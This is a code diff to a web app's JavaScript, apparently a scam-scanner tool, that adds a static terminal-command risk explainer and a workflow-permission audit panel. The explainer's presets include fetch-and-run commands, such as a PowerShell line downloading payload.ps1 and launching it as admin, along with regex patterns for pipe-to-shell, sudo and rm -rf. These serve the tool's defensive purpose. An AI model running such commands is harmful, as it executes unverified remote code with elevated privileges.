@@ -333,17 +333,18 @@ function getRecentScans() {
 function saveRecentScan(inputTextVal, inputUrlVal, reportData) {
   try {
     let scans = getRecentScans();
+    const rawPreview = (inputTextVal && inputTextVal.trim()) ? inputTextVal.trim() : (inputUrlVal || "URL Scan");
     const newEntry = {
       id: Date.now().toString(),
       timestamp: new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' }),
-      text: inputTextVal,
-      url: inputUrlVal,
-      preview: inputTextVal.slice(0, 80).trim() + (inputTextVal.length > 80 ? "..." : ""),
+      text: inputTextVal || "",
+      url: inputUrlVal || "",
+      preview: rawPreview.slice(0, 80) + (rawPreview.length > 80 ? "..." : ""),
       data: reportData
     };
 
-    // Filter duplicate text
-    scans = scans.filter(s => s.text !== inputTextVal);
+    // Filter duplicate entries
+    scans = scans.filter(s => !(s.text === (inputTextVal || "") && s.url === (inputUrlVal || "")));
     scans.unshift(newEntry);
 
     if (scans.length > MAX_RECENT_SCANS) {
@@ -448,12 +449,15 @@ async function handleAnalyze(e) {
 
   // Determine scan mode and payload
   const scanMode = normalizedUrl && text ? "combined" : normalizedUrl ? "url_only" : "text_only";
+  const effectiveText = text || `Analyze this URL for phishing, scam, or malware risk: ${normalizedUrl}`;
   const payload = {
     source: "WebApp",
     url: normalizedUrl,
-    text: text,
+    target_url: normalizedUrl,
+    text: effectiveText,
+    prompt: effectiveText,
     scan_type: scanMode,
-    prompt: scanMode === "url_only" ? `Analyze this URL for phishing, scam, or malware risk: ${normalizedUrl}` : undefined
+    scan_mode: scanMode
   };
 
   try {
@@ -744,8 +748,465 @@ function setupOcrHandlers() {
   });
 }
 
-// Setup copy buttons for browser extension URLs
-function setupBrowserUrlCopy() {
+// ==========================================================================
+// Feature A: Static Command Explainer (NoMalice CLI Inspection)
+// ==========================================================================
+const cmdInput = document.getElementById("cmd-input");
+const btnExplainCommand = document.getElementById("btn-explain-command");
+const btnClearCommand = document.getElementById("btn-clear-command");
+const cmdOutput = document.getElementById("cmd-output");
+const cmdRiskIndicator = document.getElementById("cmd-risk-indicator");
+const cmdRiskLabel = document.getElementById("cmd-risk-label");
+const cmdBlindspotAlert = document.getElementById("cmd-blindspot-alert");
+const cmdBlindspotText = document.getElementById("cmd-blindspot-text");
+const cmdWarningsContainer = document.getElementById("cmd-warnings-container");
+const cmdWarningsList = document.getElementById("cmd-warnings-list");
+const cmdStepsList = document.getElementById("cmd-steps-list");
+
+const btnCmdPresetCurl = document.getElementById("btn-cmd-preset-curl");
+const btnCmdPresetNpm = document.getElementById("btn-cmd-preset-npm");
+const btnCmdPresetPowershell = document.getElementById("btn-cmd-preset-powershell");
+
+const CMD_PRESETS = {
+  curl: "curl -fsSL https://get.docker.com | sudo sh",
+  npm: "npm install -g nodemon --save-dev",
+  powershell: "Invoke-WebRequest -Uri https://example.com/payload.ps1 -OutFile run.ps1; Start-Process run.ps1 -Verb runAs"
+};
+
+function inspectTerminalCommand(rawCmd) {
+  const cmd = String(rawCmd || "").trim();
+  if (!cmd) return null;
+
+  const steps = [];
+  const warnings = [];
+  let hasBlindspot = false;
+  let blindspotReason = "";
+  let overallRisk = "safe"; // safe, suspicious, high-risk
+
+  // Check for pipe to shell (Blind-Spot)
+  const pipeToShellRegex = /\|\s*(?:sudo\s+)?(?:sh|bash|zsh|dash|powershell|pwsh|cmd)(?:\s+|$)/i;
+  if (pipeToShellRegex.test(cmd)) {
+    hasBlindspot = true;
+    blindspotReason = "This command downloads and pipes a remote payload directly into a shell interpreter at runtime. The contents of remote code cannot be verified beforehand and may change dynamically or inject malicious scripts.";
+    warnings.push({
+      type: "high",
+      title: "Piped Remote Code Execution",
+      desc: "Executing remote payloads directly via '| sh' or '| bash' completely bypasses file scanning and static code review."
+    });
+    overallRisk = "high-risk";
+  }
+
+  // Elevated privileges check
+  if (/\b(?:sudo|doas|runas|Start-Process\s+.*-Verb\s+runas)\b/i.test(cmd)) {
+    warnings.push({
+      type: "high",
+      title: "Elevated / Admin Privileges Requested",
+      desc: "Command runs with root or administrator access, giving it full unrestricted control over system files and device security."
+    });
+    if (overallRisk !== "high-risk") overallRisk = "high-risk";
+  }
+
+  // Network download tools
+  if (/\b(?:curl|wget|Invoke-WebRequest|iwr|Invoke-RestMethod|irm|fetch)\b/i.test(cmd)) {
+    warnings.push({
+      type: "suspicious",
+      title: "Network Download / External Transmission",
+      desc: "Connects to remote endpoints to fetch data, files, or executable scripts over HTTP/HTTPS."
+    });
+    if (overallRisk === "safe") overallRisk = "suspicious";
+  }
+
+  // Destructive or modifying file operations
+  if (/\b(?:rm\s+-rf|rmdir\s+\/s|del\s+\/f|chmod\s+\+x|chmod\s+777|chown)\b/i.test(cmd)) {
+    warnings.push({
+      type: "suspicious",
+      title: "System / Permission Mutation",
+      desc: "Modifies file attributes, executes permissions (chmod +x), or deletes directory hierarchies (rm -rf)."
+    });
+    if (overallRisk === "safe") overallRisk = "suspicious";
+  }
+
+  // Background or hidden processes
+  if (/(\s+nohup\s+|&\s*$|Start-Process\s+.*-WindowStyle\s+Hidden)/i.test(cmd)) {
+    warnings.push({
+      type: "suspicious",
+      title: "Hidden or Background Execution",
+      desc: "Runs decoupled from the active terminal session or in hidden window style."
+    });
+  }
+
+  // Step-by-step breakdown using segments split by pipes or chain operators (|, &&, ;, ||)
+  const segments = cmd.split(/(\|{1,2}|&&|;)/).map(s => s.trim()).filter(Boolean);
+  let segmentIndex = 1;
+
+  for (let i = 0; i < segments.length; i++) {
+    const part = segments[i];
+    if (part === "|" || part === "||" || part === "&&" || part === ";") {
+      let opName = "Pipe (passes standard output of previous command as input to next)";
+      if (part === "&&") opName = "Sequential AND (runs next command only if previous succeeded)";
+      if (part === ";") opName = "Delimiter (executes sequentially regardless of exit status)";
+      if (part === "||") opName = "Sequential OR (runs next command only if previous failed)";
+      steps.push({
+        num: "-",
+        label: `Operator: ${part}`,
+        explanation: opName,
+        isOperator: true
+      });
+      continue;
+    }
+
+    // Breakdown components of this segment
+    const tokens = part.split(/\s+/);
+    const mainBin = tokens[0] || "";
+    let stepTitle = `Execute '${mainBin}'`;
+    let explanation = `Invokes '${mainBin}' binary with provided arguments.`;
+
+    if (/^curl$/i.test(mainBin)) {
+      stepTitle = "curl: Fetch Network Resource";
+      const flags = tokens.filter(t => t.startsWith("-")).join(" ");
+      const url = tokens.find(t => /^https?:\/\//i.test(t)) || "specified URL";
+      explanation = `Downloads web content from ${url}. Flags: ${flags || "none"} (e.g., -f = fail silently on HTTP error, -s = silent mode, -S = show error if fails, -L = follow HTTP redirects).`;
+    } else if (/^wget$/i.test(mainBin)) {
+      stepTitle = "wget: Download Remote File";
+      const url = tokens.find(t => /^https?:\/\//i.test(t)) || "specified URL";
+      explanation = `Retrieves file from ${url} directly to local disk.`;
+    } else if (/^(?:sudo|doas)$/i.test(mainBin)) {
+      stepTitle = "sudo: Execute with Superuser Privileges";
+      const target = tokens.slice(1).join(" ");
+      explanation = `Elevates current permissions to superuser (root) to run: '${target}'. Requires system password authentication.`;
+    } else if (/^(?:sh|bash|zsh)$/i.test(mainBin)) {
+      stepTitle = `${mainBin}: Shell Script Interpreter`;
+      explanation = `Feeds input data directly into the ${mainBin} command interpreter for immediate execution.`;
+    } else if (/^npm$/i.test(mainBin)) {
+      const sub = tokens[1] || "";
+      stepTitle = `npm ${sub}: Node Package Manager`;
+      explanation = `Manages JavaScript dependencies. Note: npm packages run pre/post-install lifecycle scripts that can execute arbitrary node/shell code automatically.`;
+    } else if (/^Invoke-WebRequest$/i.test(mainBin) || /^iwr$/i.test(mainBin)) {
+      stepTitle = "PowerShell: Web Request";
+      explanation = "Retrieves content or files from a remote web server using Microsoft Windows PowerShell.";
+    } else if (/^chmod$/i.test(mainBin)) {
+      stepTitle = "chmod: Modify File Access Permissions";
+      explanation = `Alters Unix file permissions (e.g. adding executable bit +x so files can run as programs).`;
+    }
+
+    steps.push({
+      num: String(segmentIndex++).padStart(2, '0'),
+      label: stepTitle,
+      commandSnippet: part,
+      explanation: explanation
+    });
+  }
+
+  return {
+    rawCmd: cmd,
+    steps,
+    warnings,
+    hasBlindspot,
+    blindspotReason,
+    overallRisk
+  };
+}
+
+function handleExplainCommand() {
+  const cmd = (cmdInput.value || "").trim();
+  if (!cmd) {
+    showStatus("Please enter a terminal command to inspect.", "error");
+    cmdInput.focus();
+    return;
+  }
+
+  const analysis = inspectTerminalCommand(cmd);
+  if (!analysis) return;
+
+  cmdOutput.hidden = false;
+
+  // Set risk badge
+  cmdRiskIndicator.className = `cmd-risk-indicator risk-${analysis.overallRisk}`;
+  if (analysis.overallRisk === "high-risk") {
+    cmdRiskLabel.textContent = "High Risk / Critical Flags";
+  } else if (analysis.overallRisk === "suspicious") {
+    cmdRiskLabel.textContent = "Review Recommended";
+  } else {
+    cmdRiskLabel.textContent = "Low Risk / Standard";
+  }
+
+  // Blindspot alert
+  if (analysis.hasBlindspot) {
+    cmdBlindspotText.textContent = analysis.blindspotReason;
+    cmdBlindspotAlert.hidden = false;
+  } else {
+    cmdBlindspotAlert.hidden = true;
+  }
+
+  // Warnings
+  cmdWarningsList.innerHTML = "";
+  if (analysis.warnings.length > 0) {
+    analysis.warnings.forEach(w => {
+      const li = document.createElement("li");
+      li.className = `warning-item warning-${w.type}`;
+      li.innerHTML = `<strong>${escapeHtml(w.title)}:</strong> ${escapeHtml(w.desc)}`;
+      cmdWarningsList.appendChild(li);
+    });
+    cmdWarningsContainer.hidden = false;
+  } else {
+    cmdWarningsContainer.hidden = true;
+  }
+
+  // Steps
+  cmdStepsList.innerHTML = "";
+  analysis.steps.forEach(s => {
+    const item = document.createElement("div");
+    if (s.isOperator) {
+      item.className = "cmd-step-row is-operator";
+      item.innerHTML = `<span class="step-op-chip">${escapeHtml(s.label)}</span> <span class="step-op-desc">${escapeHtml(s.explanation)}</span>`;
+    } else {
+      item.className = "cmd-step-row";
+      item.innerHTML = `
+        <div class="step-badge">${s.num}</div>
+        <div class="step-detail">
+          <div class="step-title-text">${escapeHtml(s.label)}</div>
+          <code class="step-code-preview">${escapeHtml(s.commandSnippet)}</code>
+          <p class="step-explanation-text">${escapeHtml(s.explanation)}</p>
+        </div>
+      `;
+    }
+    cmdStepsList.appendChild(item);
+  });
+
+  cmdOutput.scrollIntoView({ behavior: "smooth", block: "start" });
+}
+
+function handleClearCommand() {
+  cmdInput.value = "";
+  cmdOutput.hidden = true;
+  cmdInput.focus();
+}
+
+// ==========================================================================
+// Feature B: Workflow Permission & Data Log Transparency
+// ==========================================================================
+const wfAppsInput = document.getElementById("wf-apps-input");
+const wfTriggerInput = document.getElementById("wf-trigger-input");
+const btnInspectWorkflow = document.getElementById("btn-inspect-workflow");
+const btnClearWorkflow = document.getElementById("btn-clear-workflow");
+const workflowOutput = document.getElementById("workflow-output");
+const wfBadge = document.getElementById("wf-badge");
+const wfBeforeContent = document.getElementById("wf-before-content");
+const wfDuringContent = document.getElementById("wf-during-content");
+const wfAfterContent = document.getElementById("wf-after-content");
+
+const btnWfPresetSheets = document.getElementById("btn-wf-preset-sheets");
+const btnWfPresetEmail = document.getElementById("btn-wf-preset-email");
+const btnWfPresetCrm = document.getElementById("btn-wf-preset-crm");
+
+const WF_PRESETS = {
+  sheets: {
+    apps: "Webhook, Make.com Engine, Google Sheets",
+    trigger: "Incoming threat analysis webhook triggers Make.com scenario, formats risk score & 7 output fields, then appends a new row to Google Sheets audit log."
+  },
+  email: {
+    apps: "Gmail, Google Drive, Slack, Webhook",
+    trigger: "New incoming email with PDF attachment triggers workflow; uploads attachment to Shared Google Drive and posts summary message with download link into #security Slack channel."
+  },
+  crm: {
+    apps: "HubSpot CRM, Stripe, Discord Webhook",
+    trigger: "New customer lead created in CRM; queries Stripe billing customer ID and posts payment status alert to Discord staff channel."
+  }
+};
+
+function inspectWorkflowTransparency(appsStr, triggerStr) {
+  const apps = (appsStr || "").split(/[,+&]/).map(a => a.trim()).filter(Boolean);
+  const trigger = (triggerStr || "").trim();
+
+  // 1. Stage 1: Before Run Permissions
+  const permissionsList = [];
+  apps.forEach(app => {
+    const a = app.toLowerCase();
+    if (a.includes("gmail") || a.includes("email")) {
+      permissionsList.push({
+        app: app,
+        scope: "https://www.googleapis.com/auth/gmail.readonly / gmail.send",
+        level: "High",
+        detail: "Read access to incoming email subjects, bodies, recipient metadata, and attachments."
+      });
+    } else if (a.includes("sheet")) {
+      permissionsList.push({
+        app: app,
+        scope: "https://www.googleapis.com/auth/spreadsheets",
+        level: "Medium",
+        detail: "Permission to read and write rows, modify cell contents, and add records."
+      });
+    } else if (a.includes("drive")) {
+      permissionsList.push({
+        app: app,
+        scope: "https://www.googleapis.com/auth/drive.file",
+        level: "Medium",
+        detail: "Permission to upload files, generate sharing links, and manage workflow documents."
+      });
+    } else if (a.includes("slack") || a.includes("discord")) {
+      permissionsList.push({
+        app: app,
+        scope: "incoming-webhook / chat:write",
+        level: "Low",
+        detail: "Send formatted alert messages into designated public or private channels."
+      });
+    } else if (a.includes("stripe")) {
+      permissionsList.push({
+        app: app,
+        scope: "read_only (Customers, Charges, Invoices)",
+        level: "High",
+        detail: "Access to payment statuses, customer identifiers, billing emails, and charge receipts."
+      });
+    } else if (a.includes("webhook")) {
+      permissionsList.push({
+        app: app,
+        scope: "Public Webhook Endpoint (Tokenized URL)",
+        level: "Medium",
+        detail: "Listens for unauthenticated/authenticated incoming JSON POST requests."
+      });
+    } else {
+      permissionsList.push({
+        app: app,
+        scope: "Standard OAuth 2.0 API Scopes",
+        level: "Medium",
+        detail: "Requested read/write permissions necessary to synchronize data between services."
+      });
+    }
+  });
+
+  // 2. Stage 2: During Run Behavior
+  const duringNotes = [
+    {
+      title: "Silent Autonomous Execution",
+      desc: "Once enabled, the automation scenario runs continuously on platform workers without interactive user presence or browser sessions."
+    },
+    {
+      title: "No Mid-Run Permission Prompts",
+      desc: "All authentication relies on pre-issued OAuth refresh tokens or permanent API keys. The workflow will never prompt you before performing each action."
+    },
+    {
+      title: "Payload Processing & Transformation",
+      desc: `Incoming trigger data (${apps[0] || 'Trigger'}) is passed in memory to downstream connectors (${apps.slice(1).join(', ') || 'Connected Apps'}).`
+    }
+  ];
+
+  // 3. Stage 3: After Run Data Logs & PII Exposure
+  const afterNotes = [
+    {
+      category: "Execution Run History",
+      items: [
+        "Full request and response payloads are retained in automation platform logs (e.g. Make.com History / Zapier Task History).",
+        "Parameters such as email addresses, IP addresses, submitted scan URLs, or customer names will remain visible in execution inspect views."
+      ]
+    },
+    {
+      category: "Data Retention & Log Scrubbing",
+      items: [
+        "Logs are typically retained on the orchestration provider for 30 to 90 days depending on tier settings.",
+        "Ensure data privacy compliance: Do not pass cleartext passwords, session tokens, or unredacted financial card numbers through logs."
+      ]
+    },
+    {
+      category: "Access Revocation & Control",
+      items: [
+        "You can invalidate connections at any time via the service OAuth dashboard or by rotating webhook secret tokens.",
+        "Turning off the scenario immediately ceases new runs, but existing log history persists until expiration."
+      ]
+    }
+  ];
+
+  return {
+    apps,
+    trigger,
+    permissionsList,
+    duringNotes,
+    afterNotes
+  };
+}
+
+function handleInspectWorkflow() {
+  const appsVal = (wfAppsInput.value || "").trim();
+  const triggerVal = (wfTriggerInput.value || "").trim();
+
+  if (!appsVal) {
+    showStatus("Please list the connected apps in your workflow.", "error");
+    wfAppsInput.focus();
+    return;
+  }
+
+  const audit = inspectWorkflowTransparency(appsVal, triggerVal);
+
+  workflowOutput.hidden = false;
+  wfBadge.textContent = `${audit.apps.length} Apps Audited`;
+
+  // Render Before
+  let beforeHtml = `<div class="wf-scopes-grid">`;
+  audit.permissionsList.forEach(p => {
+    let levelClass = "safe";
+    if (p.level === "High") levelClass = "high-risk";
+    else if (p.level === "Medium") levelClass = "suspicious";
+
+    beforeHtml += `
+      <div class="wf-scope-card">
+        <div class="wf-scope-header">
+          <span class="wf-app-name">${escapeHtml(p.app)}</span>
+          <span class="wf-scope-pill ${levelClass}">${p.level} Access</span>
+        </div>
+        <code class="wf-scope-code">${escapeHtml(p.scope)}</code>
+        <p class="wf-scope-detail">${escapeHtml(p.detail)}</p>
+      </div>
+    `;
+  });
+  beforeHtml += `</div>`;
+  wfBeforeContent.innerHTML = beforeHtml;
+
+  // Render During
+  let duringHtml = `<ul class="wf-info-list">`;
+  audit.duringNotes.forEach(d => {
+    duringHtml += `<li><strong>${escapeHtml(d.title)}:</strong> ${escapeHtml(d.desc)}</li>`;
+  });
+  duringHtml += `</ul>`;
+  wfDuringContent.innerHTML = duringHtml;
+
+  // Render After
+  let afterHtml = `<div class="wf-after-grid">`;
+  audit.afterNotes.forEach(a => {
+    afterHtml += `
+      <div class="wf-after-block">
+        <h5>${escapeHtml(a.category)}</h5>
+        <ul>
+          ${a.items.map(item => `<li>${escapeHtml(item)}</li>`).join('')}
+        </ul>
+      </div>
+    `;
+  });
+  afterHtml += `</div>`;
+  wfAfterContent.innerHTML = afterHtml;
+
+  workflowOutput.scrollIntoView({ behavior: "smooth", block: "start" });
+}
+
+function handleClearWorkflow() {
+  wfAppsInput.value = "";
+  wfTriggerInput.value = "";
+  workflowOutput.hidden = true;
+  wfAppsInput.focus();
+}
+
+function loadWfPreset(key) {
+  const p = WF_PRESETS[key];
+  if (!p) return;
+  wfAppsInput.value = p.apps;
+  wfTriggerInput.value = p.trigger;
+  handleInspectWorkflow();
+}
+
+function loadCmdPreset(key) {
+  const cmd = CMD_PRESETS[key];
+  if (!cmd) return;
+  cmdInput.value = cmd;
+  handleExplainCommand();
+}
   function copyTextToClipboard(text, btnElement, successMsg = "Copied!") {
     navigator.clipboard.writeText(text).then(() => {
       const origText = btnElement.innerHTML;
@@ -800,6 +1261,20 @@ function initialize() {
   btnCopyReport.addEventListener("click", copyReportToClipboard);
   btnToggleJson.addEventListener("click", toggleRawJson);
   btnClearHistory.addEventListener("click", clearRecentScans);
+
+  // Command Explainer actions
+  if (btnExplainCommand) btnExplainCommand.addEventListener("click", handleExplainCommand);
+  if (btnClearCommand) btnClearCommand.addEventListener("click", handleClearCommand);
+  if (btnCmdPresetCurl) btnCmdPresetCurl.addEventListener("click", () => loadCmdPreset("curl"));
+  if (btnCmdPresetNpm) btnCmdPresetNpm.addEventListener("click", () => loadCmdPreset("npm"));
+  if (btnCmdPresetPowershell) btnCmdPresetPowershell.addEventListener("click", () => loadCmdPreset("powershell"));
+
+  // Workflow Transparency actions
+  if (btnInspectWorkflow) btnInspectWorkflow.addEventListener("click", handleInspectWorkflow);
+  if (btnClearWorkflow) btnClearWorkflow.addEventListener("click", handleClearWorkflow);
+  if (btnWfPresetSheets) btnWfPresetSheets.addEventListener("click", () => loadWfPreset("sheets"));
+  if (btnWfPresetEmail) btnWfPresetEmail.addEventListener("click", () => loadWfPreset("email"));
+  if (btnWfPresetCrm) btnWfPresetCrm.addEventListener("click", () => loadWfPreset("crm"));
 
   // Shortcut: Ctrl+Enter / Cmd+Enter
   inputText.addEventListener("keydown", (e) => {
